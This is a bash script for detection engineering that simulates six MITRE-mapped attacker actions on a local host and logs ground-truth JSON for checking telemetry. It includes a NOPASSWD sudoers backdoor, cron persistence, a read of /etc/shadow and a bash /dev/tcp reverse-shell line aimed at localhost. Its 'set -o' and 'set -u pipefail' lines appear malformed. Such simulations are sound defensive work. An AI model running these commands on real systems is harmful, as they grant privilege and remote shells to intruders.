#!/bin/bash
#
# name: 11-linux_attack_sim.sh
# Linux Attacker Simulation - Telemetry Ground Truth (Block 2, Task 11)
#
# purpose: Executes a controlled, BENIGN sequence of attacker-like actions against the
# LOCAL hardened endpoint to validate detection instrumentation, records each
# with a UTC timestamp and MITRE mapping, writes ground truth JSON, then removes all artifacts.
# 
# author: Mahdi Hamidi
#
#   >>> RUN ONLY ON A SYSTEM YOU OWN OR ARE AUTHORIZED TO TEST. <<<
#   Reverse shell targets localhost with no listener (connect attempt only).
#   /etc/shadow is read to /dev/null. No data leaves the host.
#
# Requires: root (sudo), bash 4+

set -e
set -o
set -u pipefail

# ------------------------------ Setup ----------------------------------------
if [ "$(id -u)" -ne 0 ]; then
    echo "[!] This script must be run as root (sudo)." >&2
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT="$SCRIPT_DIR/linux_attack_log.json"

ATTACK_USER="testattacker"
SUDOERS_FILE="/etc/sudoers.d/backdoor"
TMP_BIN="/tmp/suspicious_bin"
CRON_FILE="/etc/cron.d/persistence_test"
BEACON="/tmp/beacon.sh"
RS_HOST="127.0.0.1"
RS_PORT="4444"

records=()

ts_now() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }

add_record() {
    # num, description, timestamp, detection, mitre_technique, mitre_id
    records+=("$(printf '    {\n      "action_number": %d,\n      "description": "%s",\n      "timestamp": "%s",\n      "expected_detection": "%s",\n      "mitre_technique": "%s",\n      "mitre_id": "%s"\n    }' \
        "$1" "$2" "$3" "$4" "$5" "$6")")
}

# ------------------------------ Cleanup --------------------------------------
cleanup() {
    userdel -r "$ATTACK_USER" 2>/dev/null
    rm -f "$SUDOERS_FILE" "$TMP_BIN" "$CRON_FILE" "$BEACON" 2>/dev/null
}
# Ensure artifacts are removed even if a step fails midway.
trap cleanup EXIT

# ------------------------------ Simulation -----------------------------------
echo "[*] Running Linux attacker simulation..."

# --- [1/6] Create user -------------------------------------------------------
ts=$(ts_now)
printf '    [1/6] %-44s %s\n' "Creating user ${ATTACK_USER}..." "$ts"
useradd "$ATTACK_USER" 2>/dev/null
add_record 1 "Created local user ${ATTACK_USER}" "$ts" \
    "auditd USER_MGMT/ADD_USER; /var/log/auth.log (useradd)" \
    "Create Account: Local Account" "T1136.001"

# --- [2/6] Modify sudoers ----------------------------------------------------
ts=$(ts_now)
printf '    [2/6] %-44s %s\n' "Modifying sudoers..." "$ts"
echo "${ATTACK_USER} ALL=(ALL) NOPASSWD:ALL" >> "$SUDOERS_FILE"
chmod 0440 "$SUDOERS_FILE" 2>/dev/null
add_record 2 "Wrote NOPASSWD entry to ${SUDOERS_FILE}" "$ts" \
    "auditd watch -w /etc/sudoers.d/ -p wa -k sudoers_change" \
    "Abuse Elevation Control Mechanism: Sudo and Sudo Caching" "T1548.003"

# --- [3/6] Execute from /tmp -------------------------------------------------
ts=$(ts_now)
printf '    [3/6] %-44s %s\n' "Executing from /tmp..." "$ts"
cp /usr/bin/id "$TMP_BIN" && "$TMP_BIN" >/dev/null 2>&1
add_record 3 "Copied /usr/bin/id to ${TMP_BIN} and executed it" "$ts" \
    "auditd execve syscall (-S execve -k exec); path under /tmp" \
    "Command and Scripting Interpreter: Unix Shell" "T1059.004"

# --- [4/6] Reverse shell attempt to localhost (no listener) ------------------
ts=$(ts_now)
printf '    [4/6] %-44s %s\n' "Reverse shell attempt (localhost)..." "$ts"
# Connect attempt to /dev/tcp/127.0.0.1/4444 - refused, so no shell is opened.
# timeout guarantees nothing lingers even if a listener were present.
timeout 2 bash -c "bash -i >& /dev/tcp/${RS_HOST}/${RS_PORT} 0>&1" 2>/dev/null &
rs_pid=$!
sleep 1
kill "$rs_pid" 2>/dev/null
wait "$rs_pid" 2>/dev/null
add_record 4 "Attempted bash /dev/tcp reverse shell to ${RS_HOST}:${RS_PORT} (localhost, no listener)" "$ts" \
    "auditd connect syscall; Sysmon-for-Linux Event 3 (network connect)" \
    "Command and Scripting Interpreter: Unix Shell" "T1059.004"

# --- [5/6] Cron persistence --------------------------------------------------
ts=$(ts_now)
printf '    [5/6] %-44s %s\n' "Cron persistence..." "$ts"
echo "* * * * * ${BEACON}" > "$CRON_FILE"
add_record 5 "Wrote cron persistence entry to ${CRON_FILE}" "$ts" \
    "auditd watch -w /etc/cron.d/ -p wa -k cron_change" \
    "Scheduled Task/Job: Cron" "T1053.003"

# --- [6/6] Access sensitive files --------------------------------------------
ts=$(ts_now)
printf '    [6/6] %-44s %s\n' "Accessing /etc/shadow..." "$ts"
cat /etc/shadow > /dev/null
add_record 6 "Read /etc/shadow (redirected to /dev/null)" "$ts" \
    "auditd watch -w /etc/shadow -p r -k shadow_access" \
    "OS Credential Dumping: /etc/passwd and /etc/shadow" "T1003.008"

# ------------------------------ Ground truth JSON ----------------------------
{
    echo '{'
    echo '  "simulation": "linux_attack_sim",'
    echo "  \"generated_at\": \"$(ts_now)\","
    echo '  "actions": ['
    for i in "${!records[@]}"; do
        if [ "$i" -lt $(( ${#records[@]} - 1 )) ]; then
            echo "${records[$i]},"
        else
            echo "${records[$i]}"
        fi
    done
    echo '  ]'
    echo '}'
} > "$OUTPUT"

# ------------------------------ Cleanup + summary ----------------------------
printf '[*] %-49s %s\n' "Cleaning up artifacts..." "[CLEAN]"
cleanup
trap - EXIT   # cleanup done explicitly; disarm the trap

echo "Actions executed: ${#records[@]}"
echo "Ground truth saved to: $(basename "$OUTPUT")"
